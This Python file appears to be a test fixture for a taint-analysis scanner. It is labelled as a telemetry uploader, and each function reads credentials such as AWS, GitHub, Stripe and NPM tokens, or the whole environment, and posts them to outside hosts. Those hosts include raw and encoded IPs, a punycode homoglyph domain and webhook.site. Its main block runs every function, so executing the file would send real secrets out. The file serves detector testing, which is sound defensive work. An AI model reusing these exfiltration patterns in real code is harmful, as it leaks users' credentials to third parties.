#!/usr/bin/env python3
"""Telemetry uploader (example: every function is a credential -> network exfil flow).

This file is an intentional RED fixture for the taint pass. Each function reads a
secret from the environment and routes it into a network call. The destination of
the call decides TF001 (CRITICAL) vs TF002 (HIGH).
"""

import os
import sys
import urllib.request

import requests
import httpx


# --- TF001: credential -> network, reputation-bad / user-controlled destination ---

def v1_container_public_ip():
    # secret -> dict literal -> POST to a bare public IP literal
    token = os.environ["AWS_SECRET_ACCESS_KEY"]
    payload = {"k": token}
    requests.post("https://8.8.8.8/collect", json=payload)


def v2_user_controlled_url(target_url):
    # secret -> POST to a runtime-controlled URL (non-literal destination)
    key = os.getenv("GITHUB_TOKEN")
    requests.post(target_url, data=key)


def v3_fstring_dest(exfil_host):
    # secret -> dict literal -> POST to an f-string (non-literal) destination
    sec = os.environ["STRIPE_KEY"]
    requests.post(f"https://{exfil_host}/c", data={"s": sec})


def v4_hex_encoded_ip():
    # secret -> POST to a hex-encoded IP literal
    tok = os.environ.get("SLACK_TOKEN")
    requests.post("http://0x08080808/in", json={"t": tok})


def v5_punycode():
    # secret -> POST to a punycode / IDN homoglyph host
    k = os.environ["GH_TOKEN"]
    httpx.post("https://xn--80ak6aa92e.com/in", json={"t": k})


def v6_known_exfil_host():
    # secret -> POST to a known anonymous-webhook exfil host (named, caught by the
    # shared exfil-host set, not by IP reputation)
    tok = os.environ["API_KEY"]
    requests.post("https://webhook.site/abc", json={"tok": tok})


def v7_urllib_user_url(attacker):
    # secret -> urllib sink with a runtime-controlled URL
    k = os.getenv("API_KEY")
    urllib.request.urlopen(attacker, data=k.encode())


# --- TF002 (discrimination): benign-SHAPED credential egress -> HIGH, never CRITICAL ---

def vd1_legit_named_api():
    # the legitimate authenticated API client shape: secret in an Authorization
    # header to a hardcoded NAMED host -> TF002 HIGH, must NOT be TF001 CRITICAL
    token = os.environ["MY_API_KEY"]
    requests.post("https://api.myservice.com/v1", headers={"Authorization": token})


def vd2_loopback_dev():
    # loopback dev callback: secret to 127.0.0.1 -> TF002 HIGH, must NOT be CRITICAL
    dev = os.environ["DEV_TOKEN"]
    requests.post("http://127.0.0.1:8000/cb", json={"t": dev})


# --- adversarial-review regression locks (each a distinct syntactic form) ---

def v8_request_method_positional():
    # requests.request("POST", URL, ...) — the URL is arg1 (arg0 is the method);
    # the destination gate must read arg1, not the literal "POST" -> TF001
    tok = os.environ["DD_API_KEY"]
    requests.request("POST", "https://185.220.101.5/r", json={"k": tok})


def v9_whole_environment_dump():
    # dict(os.environ) is a whole-environment read (every secret at once) -> TF001
    blob = dict(os.environ)
    requests.post("http://2130706433/all", json=blob)


def v10_match_case_body():
    # a credential -> sink INSIDE a match/case body must still be traversed -> TF001
    tok = os.environ["NPM_TOKEN"]
    mode = "up"
    match mode:
        case "up":
            requests.post("https://93.184.216.34/m", data=tok)
        case _:
            pass


def v11_lambda_body():
    # a credential -> sink INSIDE a lambda body must still be scanned -> TF001
    upload = lambda: requests.post("https://45.83.122.10/l", data=os.getenv("CI_TOKEN"))
    return upload


def v12_walrus_binding():
    # secret bound by a walrus (:=) — the taint pass must enumerate NamedExpr, not just
    # Assign (Codex audit; the binding-construct disease, not the walrus instance) -> TF001
    if (tok := os.environ["WALRUS_TOKEN"]):
        requests.post("https://8.8.8.9/w", data=tok)


def v13_for_target():
    # secret element of a tainted iterable bound by a for-target -> TF001 (the sibling
    # of the walrus fix: every binding construct, not just Assign)
    for v in os.environ.values():
        requests.post("https://93.184.216.35/f", data=v)


if __name__ == "__main__":
    v1_container_public_ip()
    v2_user_controlled_url(sys.argv[1])
    v3_fstring_dest(sys.argv[1])
    v4_hex_encoded_ip()
    v5_punycode()
    v6_known_exfil_host()
    v7_urllib_user_url(sys.argv[1])
    vd1_legit_named_api()
    vd2_loopback_dev()
    v8_request_method_positional()
    v9_whole_environment_dump()
    v10_match_case_body()
    v11_lambda_body()
    v12_walrus_binding()
    v13_for_target()
